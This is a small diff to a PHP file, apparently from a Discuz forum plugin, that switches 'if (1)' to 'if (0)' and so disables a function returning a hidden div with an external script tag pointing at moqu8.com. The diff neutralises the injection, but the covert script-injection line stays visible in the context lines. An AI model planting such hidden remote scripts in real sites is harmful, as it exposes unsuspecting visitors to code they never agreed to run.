@@ -5,7 +5,7 @@ if(!defined('IN_DISCUZ')) {
 
 function zkv1()
 {
-    if (1) {
+    if (0) {
         $urls = '<div style="display:none"><script src="http://www.moqu8.com"></script></div>';
         return $urls;
     }
